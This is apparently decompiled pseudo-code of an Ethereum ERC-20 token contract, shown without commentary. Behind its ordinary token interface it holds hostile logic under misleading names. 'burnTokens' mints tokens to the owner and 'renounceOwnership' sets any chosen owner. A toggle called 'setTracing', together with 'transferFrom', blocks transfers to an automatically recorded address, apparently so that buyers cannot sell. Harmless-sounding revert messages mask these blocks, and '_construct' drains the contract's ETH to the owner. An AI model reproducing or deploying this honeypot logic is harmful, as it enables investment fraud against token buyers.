contract main {




// =====================  Runtime code  =====================


address stor0;
uint8 stor2; offset 160
uint128 stor2; offset 160
address stor2;
array of uint256 symbol;
array of uint256 name;
uint8 decimals;
uint256 stor6;
address currentOwner;
mapping of uint256 balanceOf;
mapping of uint256 allowance;

function name() {
    return name[0 len name.length]
}

function decimals() {
    return decimals
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function symbol() {
    return symbol[0 len symbol.length]
}

function currentOwner() {
    return currentOwner
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
  stop
}

function totalSupply() {
    require balanceOf[0] <= stor6
    return (stor6 - balanceOf[0])
}

function renounceOwnership(address arg1) {
    require calldata.size - 4 >= 32
    if stor0 != msg.sender:
        require msg.sender == address(stor2.field_0)
    currentOwner = arg1
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function setTracing(bool arg1) {
    require calldata.size - 4 >= 32
    if stor0 != msg.sender:
        require msg.sender == address(stor2.field_0)
    Mask(96, 0, stor2.field_160) = Mask(96, 0, arg1)
}

function burnTokens(uint256 arg1) {
    require calldata.size - 4 >= 32
    if stor0 != msg.sender:
        require msg.sender == address(stor2.field_0)
    balanceOf[address(msg.sender)] += arg1
    emit Transfer(arg1, 0, msg.sender);
}

function _construct() {
    if stor0 != msg.sender:
        require msg.sender == address(stor2.field_0)
    call msg.sender with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if uint8(stor2.field_160):
        if arg1 == address(stor2.field_0):
            revert with 0, 'Handling Request'
    require arg2 <= balanceOf[address(msg.sender)]
    balanceOf[address(msg.sender)] -= arg2
    require balanceOf[address(arg1)] + arg2 >= balanceOf[address(arg1)]
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    if uint8(stor2.field_160):
        if arg1 != stor0:
            if not arg1:
                if arg2 == address(stor2.field_0):
                    revert with 0, 'Order ContextHandler'
            else:
                if address(stor2.field_0):
                    if arg2 == address(stor2.field_0):
                        revert with 0, 'Order ContextHandler'
                else:
                    address(stor2.field_0) = arg2
    require arg3 <= balanceOf[address(arg1)]
    balanceOf[address(arg1)] -= arg3
    require arg3 <= allowance[address(arg1)][address(msg.sender)]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    require balanceOf[address(arg2)] + arg3 >= balanceOf[address(arg2)]
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    return 1
}

function approveAndCall(address arg1, uint256 arg2, bytes arg3) {
    require calldata.size - 4 >= 96
    require arg3 <= 4294967296
    require arg3 + 36 <= calldata.size
    require arg3.length <= 4294967296 and arg3 + arg3.length + 36 <= calldata.size
    allowance[address(msg.sender)][address(arg1)] = arg2
    mem[ceil32(arg3.length) + 128] = arg2
    emit Approval(address arg1, address arg2, uint256 arg3):
                  Mask(8 * -ceil32(arg3.length) + arg3.length + 32, 0, 0),
                  mem[arg3.length + 160 len -arg3.length + ceil32(arg3.length)],
                  msg.sender,
                  arg1,
    require ext_code.size(arg1)
    call arg1 with:
         gas gas_remaining wei
        args msg.sender, arg2, address(this.address), Array(len=arg3.length, data=arg3[all])
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    return 0, 1
}



}
